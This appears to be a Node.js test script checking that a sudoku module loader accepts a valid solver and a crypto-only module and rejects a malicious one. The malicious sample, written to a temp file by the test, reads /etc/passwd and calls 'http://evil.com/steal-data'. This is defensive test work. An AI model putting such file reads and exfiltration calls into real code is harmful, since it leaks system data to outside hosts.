const { SudokuModuleLoader } = require('../enclave/sudoku-module-loader');
const fs = require('fs');

console.log('🧪 Testing Sudoku Module Loading...\n');

async function testModuleLoading() {
  const loader = new SudokuModuleLoader();

  console.log('1. Testing valid sudoku solver module...');
  try {
    const module = loader.loadModule('./private_module/sudoku-solver-selfcontained.js');
    console.log('✅ Module loaded successfully');
    console.log(`📋 Metadata:`, module.metadata);
  } catch (error) {
    console.error('❌ Failed to load valid module:', error.message);
  }

  console.log('\n2. Testing malicious module rejection...');

  // Create a malicious module for testing
  const maliciousModule = `
const fs = require('fs');
const http = require('http');

function solveSudoku(puzzle) {
  // This module tries to access the file system and make network requests
  fs.readFileSync('/etc/passwd');
  http.get('http://evil.com/steal-data');
  return puzzle;
}

module.exports = { solveSudoku };
`;

  // Use tmpfs directory in Docker (detected by read-only filesystem)
  const testDir = fs.existsSync('./test_temp') ? './test_temp' : './test';
  const maliciousPath = `${testDir}/malicious-module.js`;
  fs.writeFileSync(maliciousPath, maliciousModule);

  try {
    const module = loader.loadModule(maliciousPath);
    console.log('❌ Malicious module was incorrectly allowed!');
  } catch (error) {
    console.log('✅ Malicious module correctly rejected:', error.message.split('\n')[0]);
  } finally {
    // Cleanup
    if (fs.existsSync(maliciousPath)) {
      fs.unlinkSync(maliciousPath);
    }
  }

  console.log('\n3. Testing crypto-only module...');

  const cryptoOnlyModule = `
const crypto = require('crypto');

function solveSudoku(puzzle) {
  const hash = crypto.createHash('sha256').update(JSON.stringify(puzzle)).digest('hex');
  console.log('Puzzle hash:', hash);
  return puzzle; // Simple passthrough for testing
}

module.exports = {
  solveSudoku,
  metadata: {
    name: 'crypto-test',
    cryptoUsage: 'builtin-only'
  }
};
`;

  const cryptoPath = `${testDir}/crypto-module.js`;
  fs.writeFileSync(cryptoPath, cryptoOnlyModule);

  try {
    const module = loader.loadModule(cryptoPath);
    console.log('✅ Crypto-only module loaded successfully');
  } catch (error) {
    console.error('❌ Crypto-only module rejected:', error.message);
  } finally {
    // Cleanup
    if (fs.existsSync(cryptoPath)) {
      fs.unlinkSync(cryptoPath);
    }
  }
}

testModuleLoading().catch(console.error);